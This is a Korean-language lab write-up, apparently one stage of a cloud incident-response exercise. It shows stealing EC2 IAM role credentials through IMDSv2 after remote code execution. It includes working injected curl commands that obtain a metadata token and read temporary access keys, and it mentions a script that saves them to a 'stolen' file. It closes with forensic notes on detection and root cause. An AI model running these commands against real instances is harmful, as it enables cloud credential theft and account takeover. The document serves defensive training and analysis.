# 3단계: 자격증명 탈취 (IMDSv2)

MITRE ATT&CK: T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)

## 배경

EC2는 IMDSv2 강제 상태(`http_tokens = "required"`)다. IMDSv2는 먼저 PUT으로 세션 토큰을 받고,
이후 GET 요청 헤더에 `x-aws-ec2-metadata-token` 으로 그 토큰을 실어야 메타데이터를 읽을 수 있다.
그러나 1단계 RCE로 인스턴스 내부(온박스)에서 명령을 실행할 수 있으므로, 공격자가 토큰을 직접
발급받아 조회하면 IMDSv2라도 그대로 도달한다. root 권한은 필요 없다.

## 역할 이름 조회 (토큰 발급 포함)

우회+주입 경로로 원격에서 실행한다. `$(...)`·`$TOKEN` 은 원격 셸에서 평가돼야 한다.

```bash
inject 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "x-aws-ec2-metadata-token-ttl-seconds: 60"); curl -s -H "x-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

## 임시 자격증명 획득

```bash
ROLE=<위에서 확인한 역할 이름>   # 예: cloudir-ec2-role
inject 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "x-aws-ec2-metadata-token-ttl-seconds: 60"); curl -s -H "x-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/'"$ROLE"
```

응답 JSON에 `AccessKeyId`, `SecretAccessKey`, `Token` 이 들어 있다. `scripts/03_imds.sh` 가
이 과정을 자동화하고 `stolen/creds.env`(gitignore)로 저장한다.

## 분석 포인트 (중요)

- IMDS 접근 자체는 CloudTrail에 기록되지 않는다. 즉 "자격증명이 언제 탈취됐는가"는 CloudTrail이
  아니라 호스트 로그(웹 access log의 IMDS 호출 흔적)와 이후 API 사용 시점으로 역추적해야 한다.
- IMDSv2라도 온박스 RCE 앞에서는 자격증명 노출을 막지 못한다. 근본원인 분석에서 "IMDSv2가
  만능은 아니며, 이 시나리오의 실질 통제는 RCE 차단과 IAM 최소권한"이라는 논지의 핵심 근거다.

## 실행 결과

실제 실행 시각·역할 이름·탈취 임시키 등 재구성된 타임라인은 `analysis/timeline.md`,
침해 지표는 `analysis/iocs.md` 참조.
